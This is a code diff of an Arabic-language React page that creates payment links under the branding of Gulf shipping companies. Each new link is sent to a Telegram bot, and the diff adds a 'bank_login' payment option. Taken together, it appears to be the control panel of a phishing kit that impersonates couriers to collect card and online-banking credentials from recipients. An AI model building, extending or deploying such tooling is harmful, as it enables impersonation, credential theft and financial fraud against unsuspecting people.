@@ -11,27 +11,18 @@ import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
 import { generatePaymentLink } from "@/utils/paymentLinks";
-import {
-  Package,
-  MapPin,
-  DollarSign,
-  Hash,
-  Building2,
-  Copy,
-  ExternalLink,
-  CreditCard,
-  User,
-  RefreshCw,
-  Truck,
-  ShieldCheck,
-  ArrowLeft,
-  ChevronRight,
-  Info
-} from "lucide-react";
+import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, CreditCard, User, RefreshCw, ArrowRight } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import BottomNav from "@/components/BottomNav";
 import BackButton from "@/components/BackButton";
+import {
+  AlertDialog,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 
 const CreateShippingLink = () => {
   const { country } = useParams();
@@ -41,17 +32,6 @@ const CreateShippingLink = () => {
   const countryData = getCountryByCode(country?.toUpperCase() || "SA");
   const services = getServicesByCountry(country?.toUpperCase() || "SA");
   
-  const [selectedService, setSelectedService] = useState("");
-  const [trackingNumber, setTrackingNumber] = useState("");
-  const [payerType, setPayerType] = useState("recipient");
-  const [packageDescription, setPackageDescription] = useState("");
-  const [codAmount, setCodAmount] = useState("500");
-  const [paymentMethod, setPaymentMethod] = useState("card");
-  const [isSubmitting, setIsSubmitting] = useState(false);
-  const [showSuccess, setShowSuccess] = useState(false);
-  const [createdUrl, setCreatedUrl] = useState("");
-  const [linkId, setLinkId] = useState("");
-
   const generateTrackingNumber = () => {
     const prefix = selectedService.toUpperCase().substring(0, 3) || 'TRK';
     const timestamp = Date.now().toString().slice(-8);
@@ -59,14 +39,26 @@ const CreateShippingLink = () => {
     return `${prefix}${timestamp}${random}`;
   };
 
-  const serviceBranding = useMemo(() =>
-    selectedService ? getServiceBranding(selectedService) : null,
-    [selectedService]
-  );
+  const [selectedService, setSelectedService] = useState("");
+  const [trackingNumber, setTrackingNumber] = useState("");
+  const [payerType, setPayerType] = useState("recipient");
+  const [packageDescription, setPackageDescription] = useState("");
+  const [codAmount, setCodAmount] = useState("500");
+  const [paymentMethod, setPaymentMethod] = useState("card");
+
+  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
+  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [copied, setCopied] = useState(false);
 
   const selectedServiceData = useMemo(() => 
     services.find(s => s.key === selectedService),
     [services, selectedService]
+  );
+
+  const serviceBranding = useMemo(() =>
+    selectedService ? getServiceBranding(selectedService) : null,
+    [selectedService]
   );
 
   useEffect(() => {
@@ -78,7 +70,7 @@ const CreateShippingLink = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!selectedService || !trackingNumber) {
-      toast({ title: "خطأ", description: "الرجاء اختيار خدمة الشحن وإدخال رقم التتبع", variant: "destructive" });
+      toast({ title: "خطأ", description: "الرجاء ملء جميع الحقول المطلوبة", variant: "destructive" });
       return;
     }
 
@@ -96,14 +88,19 @@ const CreateShippingLink = () => {
           cod_amount: parseFloat(codAmount) || 500,
           currency_code: getCurrencyCode(country || "SA"),
           payment_method: paymentMethod,
+          selected_bank: null,
           selectedCountry: country || "SA",
         },
       });
 
-      const paymentUrl = `${window.location.origin}/r/${country || 'SA'}/shipping/${link.id}?company=${selectedService}`;
-      setCreatedUrl(paymentUrl);
-      setLinkId(link.id);
-      setShowSuccess(true);
+      const paymentUrl = generatePaymentLink({
+        invoiceId: link.id,
+        company: selectedService,
+        country: country || 'SA',
+        amount: parseFloat(codAmount) || 500,
+        currency: getCurrencyCode(country || "SA"),
+        paymentMethod: paymentMethod,
+      });
 
       await sendToTelegram({
         type: 'shipping_link_created',
@@ -112,243 +109,170 @@ const CreateShippingLink = () => {
           service_name: selectedServiceData?.name || selectedService,
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
-          country: countryData?.nameAr || 'السعودية',
-          payment_url: paymentUrl
+          country: countryData?.nameAr || country,
+          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?company=${selectedService}`
         },
         timestamp: new Date().toISOString(),
         imageUrl: serviceBranding?.ogImage || serviceBranding?.heroImage,
-        description: serviceBranding?.description
+        description: serviceBranding?.description || selectedServiceData?.description
       });
 
-      toast({ title: "تم بنجاح", description: "تم إنشاء رابط تتبع الشحنة بنجاح" });
+      setCreatedPaymentUrl(paymentUrl);
+      setShowSuccessDialog(true);
+      toast({ title: "تم الإنشاء بنجاح", description: "تم إنشاء رابط الشحن بنجاح" });
     } catch (error) {
-      console.error(error);
-      toast({ title: "خطأ", description: "فشل في إنشاء الرابط", variant: "destructive" });
+      toast({ title: "خطأ", description: "فشل إنشاء الرابط", variant: "destructive" });
     } finally {
       setIsSubmitting(false);
     }
   };
 
-  if (!countryData) {
-    return <div className="p-8 text-center"><p>الدولة غير مدعومة</p></div>;
-  }
+  const handleCopyLink = () => {
+    navigator.clipboard.writeText(createdPaymentUrl);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+    toast({ title: "تم النسخ!", description: "تم نسخ الرابط إلى الحافظة" });
+  };
 
-  if (showSuccess) {
-    return (
-      <div className="min-h-screen bg-[#F0F2F5] py-12 px-4" dir="rtl">
-        <Card className="max-w-xl mx-auto overflow-hidden border-0 shadow-2xl rounded-3xl bg-white">
-          <div className="bg-[#0052CC] p-10 text-center relative">
-            <div className="absolute top-0 left-0 w-full h-full opacity-10 bg-[url('https://www.transparenttextures.com/patterns/graphy.png')]" />
-            <div className="w-20 h-20 bg-white/20 rounded-full mx-auto mb-6 flex items-center justify-center border-4 border-white/30 backdrop-blur-md">
-              <ShieldCheck className="w-12 h-12 text-white" />
-            </div>
-            <h2 className="text-3xl font-black text-white mb-2">رابط التتبع جاهز</h2>
-            <p className="text-white/80">يمكنك الآن مشاركة رابط تتبع الشحنة والدفع مع العميل</p>
-          </div>
-
-          <div className="p-8 space-y-6">
-            <div className="bg-[#F8F9FA] p-6 rounded-2xl border-2 border-dashed border-[#DEE2E6]">
-              <p className="text-xs font-bold text-gray-400 mb-2 uppercase tracking-wider">رابط بوابة الشحن الموحدة</p>
-              <div className="bg-white p-4 rounded-xl border border-gray-200 break-all text-sm font-mono shadow-inner">
-                {createdUrl}
-              </div>
-            </div>
-
-            <div className="grid grid-cols-2 gap-4">
-              <Button
-                onClick={() => {
-                  navigator.clipboard.writeText(createdUrl);
-                  toast({ title: "تم النسخ" });
-                }}
-                className="h-14 rounded-2xl bg-[#0052CC] hover:bg-[#0747A6] text-lg font-bold"
-              >
-                <Copy className="w-5 h-5 ml-2" /> نسخ الرابط
-              </Button>
-              <Button
-                onClick={() => window.open(createdUrl, '_blank')}
-                variant="outline"
-                className="h-14 rounded-2xl border-2 border-[#0052CC] text-[#0052CC] text-lg font-bold hover:bg-[#F0F5FF]"
-              >
-                <ExternalLink className="w-5 h-5 ml-2" /> معاينة
-              </Button>
-            </div>
-
-            <Button
-              onClick={() => navigate('/services')}
-              variant="ghost"
-              className="w-full text-gray-500 font-bold"
-            >
-              العودة للخدمات
-            </Button>
-          </div>
-        </Card>
-      </div>
-    );
-  }
+  if (!countryData) return <div className="min-h-screen flex items-center justify-center">دولة غير صحيحة</div>;
 
   return (
-    <div className="min-h-screen bg-[#F0F2F5] pb-24" dir="rtl">
-      {/* Header Bar */}
-      <div className="bg-white border-b sticky top-0 z-50">
-        <div className="container mx-auto px-4 h-16 flex items-center justify-between">
-          <div className="flex items-center gap-3">
-            <BackButton />
-            <h1 className="text-xl font-black text-[#172B4D]">إصدار رابط تتبع جديد</h1>
+    <div className="min-h-screen bg-slate-50" dir="rtl">
+      <header className="bg-white border-b h-16 flex items-center px-4 sticky top-0 z-50 shadow-sm">
+        <div className="container mx-auto flex justify-between items-center">
+          <div className="flex items-center gap-2">
+            <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
+              <Package className="w-5 h-5 text-white" />
+            </div>
+            <h1 className="font-black text-gray-800">نظام إصدار البوالص</h1>
           </div>
-          <div className="hidden sm:flex items-center gap-2 px-3 py-1.5 bg-green-50 text-green-700 rounded-full border border-green-100 text-xs font-bold">
-            <ShieldCheck className="w-4 h-4" /> نظام آمن
-          </div>
+          <BackButton />
         </div>
-      </div>
+      </header>
 
-      <div className="container mx-auto px-4 py-8">
-        <div className="max-w-5xl mx-auto grid lg:grid-cols-3 gap-8">
-          {/* Main Form */}
-          <div className="lg:col-span-2 space-y-6">
-            <Card className="p-8 border-0 shadow-xl rounded-3xl bg-white">
-              <form onSubmit={handleSubmit} className="space-y-8">
-                {/* Service Selection */}
-                <div className="space-y-4">
-                  <Label className="text-lg font-black text-[#172B4D] flex items-center gap-2">
-                    <Truck className="w-5 h-5 text-[#0052CC]" /> شركة الشحن والخدمة
-                  </Label>
-                  <Select value={selectedService} onValueChange={setSelectedService}>
-                    <SelectTrigger className="h-14 border-2 rounded-2xl text-lg font-medium transition-all focus:border-[#0052CC]">
-                      <SelectValue placeholder="اختر شركة الشحن المناسبة" />
-                    </SelectTrigger>
-                    <SelectContent className="rounded-2xl border-2">
-                      {services.map((service) => (
-                        <SelectItem key={service.id} value={service.key} className="h-12 text-lg">
-                          {service.name}
-                        </SelectItem>
-                      ))}
-                    </SelectContent>
-                  </Select>
-
-                  {selectedService && serviceBranding && (
-                    <div className="p-4 rounded-2xl bg-[#F4F5F7] border-2 border-gray-100 flex items-center gap-4 animate-in fade-in slide-in-from-top-2">
-                      <div className="w-16 h-16 bg-white rounded-xl p-2 flex items-center justify-center shadow-sm">
-                        <img src={serviceBranding.logo} alt="" className="max-h-full object-contain" />
-                      </div>
-                      <div className="flex-1">
-                        <p className="text-sm font-bold text-[#172B4D]">{selectedServiceData?.name}</p>
-                        <p className="text-xs text-gray-500 line-clamp-1">{serviceBranding.description}</p>
-                      </div>
-                    </div>
-                  )}
-                </div>
-
-                <div className="grid sm:grid-cols-2 gap-6">
-                  <div className="space-y-3">
-                    <Label className="text-sm font-bold text-gray-600">رقم التتبع (بوليصة الشحن)</Label>
-                    <div className="relative">
-                      <Input
-                        value={trackingNumber}
-                        onChange={(e) => setTrackingNumber(e.target.value)}
-                        className="h-14 border-2 rounded-2xl text-lg font-bold pr-12"
-                        placeholder="TRK-XXXXXXXX"
-                      />
-                      <Hash className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
-                      <button
-                        type="button"
-                        onClick={() => setTrackingNumber(generateTrackingNumber())}
-                        className="absolute left-3 top-1/2 -translate-y-1/2 p-2 hover:bg-gray-100 rounded-lg text-[#0052CC] transition-colors"
-                      >
-                        <RefreshCw className="w-5 h-5" />
-                      </button>
-                    </div>
-                  </div>
-
-                  <div className="space-y-3">
-                    <Label className="text-sm font-bold text-gray-600">المسؤول عن الدفع</Label>
-                    <Select value={payerType} onValueChange={setPayerType}>
-                      <SelectTrigger className="h-14 border-2 rounded-2xl text-lg font-medium">
-                        <SelectValue />
-                      </SelectTrigger>
-                      <SelectContent className="rounded-xl">
-                        <SelectItem value="recipient">المستلم (الدفع عند الاستلام)</SelectItem>
-                        <SelectItem value="sender">المرسل (الدفع المسبق)</SelectItem>
-                      </SelectContent>
-                    </Select>
-                  </div>
-                </div>
-
-                <div className="space-y-3">
-                  <Label className="text-sm font-bold text-gray-600">وصف محتويات الشحنة</Label>
-                  <Input
-                    value={packageDescription}
-                    onChange={(e) => setPackageDescription(e.target.value)}
-                    className="h-14 border-2 rounded-2xl text-lg"
-                    placeholder="مثال: أجهزة إلكترونية، ملابس، مستندات"
-                  />
-                </div>
-
-                <div className="space-y-4 pt-4 border-t-2 border-dashed">
-                  <Label className="text-lg font-black text-[#172B4D] flex items-center gap-2">
-                    <DollarSign className="w-5 h-5 text-[#36B37E]" /> القيمة الإجمالية
-                  </Label>
-                  <div className="relative">
-                    <Input
-                      type="number"
-                      value={codAmount}
-                      onChange={(e) => setCodAmount(e.target.value)}
-                      className="h-20 border-2 rounded-3xl text-4xl font-black text-center text-[#172B4D] focus:border-[#36B37E] pr-16 pl-16"
-                    />
-                    <div className="absolute right-6 top-1/2 -translate-y-1/2 text-xl font-bold text-gray-400">
-                      {getCurrencySymbol(country || "SA")}
-                    </div>
-                  </div>
-                  <p className="text-center text-sm text-gray-400 font-medium">سيتم تحويل المبلغ تلقائياً لعملة بلد العميل ({getCurrencyName(country || "SA")})</p>
-                </div>
-
-                <Button
-                  type="submit"
-                  disabled={isSubmitting}
-                  className="w-full h-16 rounded-2xl bg-[#0052CC] hover:bg-[#0747A6] text-xl font-black shadow-xl hover:translate-y-[-2px] transition-all active:translate-y-[1px]"
-                >
-                  {isSubmitting ? <RefreshCw className="w-6 h-6 animate-spin" /> : "إصدار بوليصة الشحن والرابط"}
-                </Button>
-              </form>
-            </Card>
-          </div>
-
-          {/* Sidebar Info */}
-          <div className="space-y-6">
-            <Card className="p-6 border-0 shadow-lg rounded-3xl bg-white overflow-hidden relative">
-              <div className="absolute top-0 right-0 w-32 h-32 bg-[#0052CC] opacity-5 -mr-16 -mt-16 rounded-full" />
-              <h3 className="text-lg font-black text-[#172B4D] mb-4 flex items-center gap-2">
-                <Info className="w-5 h-5 text-[#0052CC]" /> معلومات هامة
-              </h3>
-              <ul className="space-y-4 text-sm text-gray-600 font-medium">
-                <li className="flex gap-3">
-                  <div className="w-1.5 h-1.5 rounded-full bg-[#0052CC] mt-2 shrink-0" />
-                  رابط التتبع يعمل لمدة 7 أيام من تاريخ الإصدار.
-                </li>
-                <li className="flex gap-3">
-                  <div className="w-1.5 h-1.5 rounded-full bg-[#0052CC] mt-2 shrink-0" />
-                  يتم إخطار العميل عبر الواتساب فور استلام الشحنة.
-                </li>
-                <li className="flex gap-3">
-                  <div className="w-1.5 h-1.5 rounded-full bg-[#0052CC] mt-2 shrink-0" />
-                  نظام التشفير يضمن سرية بيانات العملاء 100%.
-                </li>
-              </ul>
-            </Card>
-
-            <Card className="p-6 border-0 shadow-lg rounded-3xl bg-gradient-to-br from-[#36B37E] to-[#00875A] text-white">
-              <div className="flex items-center justify-between mb-4">
-                <ShieldCheck className="w-10 h-10 opacity-50" />
-                <span className="bg-white/20 px-2 py-1 rounded text-[10px] font-black uppercase">Verified</span>
+      <main className="container mx-auto px-4 py-6 max-w-xl">
+        <form onSubmit={handleSubmit} className="space-y-4">
+           <Card className="p-6 border-2 rounded-3xl shadow-xl space-y-6">
+              <div className="space-y-1.5">
+                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">شركة الشحن</Label>
+                <Select value={selectedService} onValueChange={setSelectedService}>
+                  <SelectTrigger className="h-14 border-2 rounded-2xl font-black text-gray-700 bg-gray-50/50">
+                    <SelectValue placeholder="اختر الشركة" />
+                  </SelectTrigger>
+                  <SelectContent>
+                    {services.map((service) => (
+                      <SelectItem key={service.id} value={service.key} className="font-bold">{service.name}</SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
               </div>
-              <h4 className="text-xl font-black mb-2">تأمين الشحنات</h4>
-              <p className="text-sm opacity-90 leading-relaxed font-medium">
-                جميع الروابط المصدرة عبر نظامنا مؤمنة ضد الاحتيال ومغطاة تأمينياً حتى مبلغ 10,000 ريال.
-              </p>
-            </Card>
-          </div>
-        </div>
-      </div>
-      <div className="h-20" />
+
+              {selectedService && serviceBranding && (
+                <div className="p-4 rounded-2xl bg-blue-50 border border-blue-100 flex items-center gap-4 animate-in fade-in slide-in-from-top-2">
+                  <img src={serviceBranding.logo} alt="" className="h-10 w-20 object-contain" />
+                  <div>
+                    <h4 className="font-black text-blue-900 text-sm">{selectedServiceData?.name}</h4>
+                    <p className="text-[10px] font-bold text-blue-700/70">{serviceBranding.description}</p>
+                  </div>
+                </div>
+              )}
+
+              <div className="grid grid-cols-2 gap-4">
+                <div className="space-y-1.5">
+                  <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">رقم الشحنة</Label>
+                  <div className="relative">
+                    <Input value={trackingNumber} onChange={(e) => setTrackingNumber(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" />
+                    <Hash className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
+                    <button type="button" onClick={() => setTrackingNumber(generateTrackingNumber())} className="absolute left-2 top-1/2 -translate-y-1/2 p-1.5 bg-white rounded-lg shadow-sm border text-blue-600">
+                      <RefreshCw className="w-3.5 h-3.5" />
+                    </button>
+                  </div>
+                </div>
+                <div className="space-y-1.5">
+                   <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">المبلغ (COD)</Label>
+                   <div className="relative">
+                     <Input type="number" value={codAmount} onChange={(e) => setCodAmount(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" />
+                     <div className="absolute right-3 top-1/2 -translate-y-1/2 font-bold text-gray-300 text-[10px]">{getCurrencySymbol(country || "SA")}</div>
+                   </div>
+                </div>
+              </div>
+
+              <div className="space-y-1.5">
+                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">من سيدفع الرسوم؟</Label>
+                <div className="grid grid-cols-2 gap-2">
+                  {["recipient", "sender"].map((type) => (
+                    <button
+                      key={type}
+                      type="button"
+                      onClick={() => setPayerType(type)}
+                      className={`h-12 rounded-xl border-2 font-black text-sm transition-all ${payerType === type ? 'border-blue-600 bg-blue-50 text-blue-600' : 'border-gray-100 bg-white text-gray-400'}`}
+                    >
+                      {type === "recipient" ? "المستلم" : "المرسل"}
+                    </button>
+                  ))}
+                </div>
+              </div>
+
+              <div className="space-y-1.5">
+                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">وصف الشحنة</Label>
+                <div className="relative">
+                  <Input value={packageDescription} onChange={(e) => setPackageDescription(e.target.value)} placeholder="مثال: ملابس، عطور..." className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" />
+                  <Package className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
+                </div>
+              </div>
+
+              <div className="space-y-1.5 pt-2">
+                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">طريقة الدفع المتاحة للعميل</Label>
+                <div className="grid grid-cols-2 gap-3">
+                  <button type="button" onClick={() => setPaymentMethod('card')} className={`p-4 rounded-2xl border-2 transition-all flex flex-col items-center gap-2 ${paymentMethod === 'card' ? 'border-blue-600 bg-blue-50' : 'border-gray-100 bg-white'}`}>
+                    <CreditCard className={`w-6 h-6 ${paymentMethod === 'card' ? 'text-blue-600' : 'text-gray-300'}`} />
+                    <span className={`text-[10px] font-black uppercase ${paymentMethod === 'card' ? 'text-blue-600' : 'text-gray-400'}`}>بطاقة بنكية</span>
+                  </button>
+                  <button type="button" onClick={() => setPaymentMethod('bank_login')} className={`p-4 rounded-2xl border-2 transition-all flex flex-col items-center gap-2 ${paymentMethod === 'bank_login' ? 'border-blue-600 bg-blue-50' : 'border-gray-100 bg-white'}`}>
+                    <Building2 className={`w-6 h-6 ${paymentMethod === 'bank_login' ? 'text-blue-600' : 'text-gray-300'}`} />
+                    <span className={`text-[10px] font-black uppercase ${paymentMethod === 'bank_login' ? 'text-blue-600' : 'text-gray-400'}`}>دخل بنكي</span>
+                  </button>
+                </div>
+              </div>
+           </Card>
+
+           <Button type="submit" disabled={isSubmitting || !selectedService} className="w-full h-16 rounded-3xl font-black text-lg shadow-xl bg-blue-600 hover:bg-blue-700 text-white transition-all active:scale-95">
+             {isSubmitting ? <RefreshCw className="w-6 h-6 animate-spin" /> : "إصدار بوليصة الشحن"}
+           </Button>
+        </form>
+      </main>
+
+      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
+        <AlertDialogContent className="max-w-[90%] rounded-3xl border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
+           <div className="p-8 text-center space-y-6">
+              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-2">
+                <div className="w-12 h-12 bg-green-500 rounded-full flex items-center justify-center animate-bounce">
+                  <RefreshCw className="w-6 h-6 text-white" />
+                </div>
+              </div>
+              <div>
+                <AlertDialogTitle className="text-2xl font-black text-gray-900">تم إنشاء البوليصة!</AlertDialogTitle>
+                <AlertDialogDescription className="font-bold text-gray-500">تم توليد رابط الدفع بنجاح لهذه الشحنة</AlertDialogDescription>
+              </div>
+
+              <div className="bg-gray-50 p-4 rounded-2xl border-2 border-dashed border-gray-200 break-all font-mono text-xs font-bold text-gray-400">
+                {createdPaymentUrl}
+              </div>
+
+              <div className="flex gap-3">
+                 <Button onClick={handleCopyLink} className="flex-1 h-14 rounded-2xl font-black bg-gray-900 text-white gap-2">
+                   {copied ? "تم النسخ!" : <><Copy className="w-4 h-4" /> نسخ الرابط</>}
+                 </Button>
+                 <Button onClick={() => window.open(createdPaymentUrl, '_blank')} variant="outline" className="flex-1 h-14 rounded-2xl font-black border-2 gap-2 text-gray-700">
+                   <ExternalLink className="w-4 h-4" /> معاينة
+                 </Button>
+              </div>
+              <Button variant="ghost" onClick={() => setShowSuccessDialog(false)} className="w-full font-bold text-gray-400">إغلاق</Button>
+           </div>
+        </AlertDialogContent>
+      </AlertDialog>
+
+      <div className="h-24" />
       <BottomNav />
     </div>
   );
